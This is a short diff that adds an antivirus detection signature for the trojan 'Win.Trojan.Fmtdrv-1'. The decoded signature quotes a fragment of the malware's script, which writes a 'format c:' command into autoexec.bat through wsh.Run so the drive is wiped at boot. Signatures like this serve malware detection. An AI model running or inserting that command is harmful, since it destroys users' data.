@@ -1,0 +1,5 @@
+VIRUS NAME: Win.Trojan.Fmtdrv-1
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+few minutes... >> c:\autoexec.bat',true,1);wsh.Run('command /c echo @format "c: < c.txt >nul" >> c:\autoexec.bat',true,1)
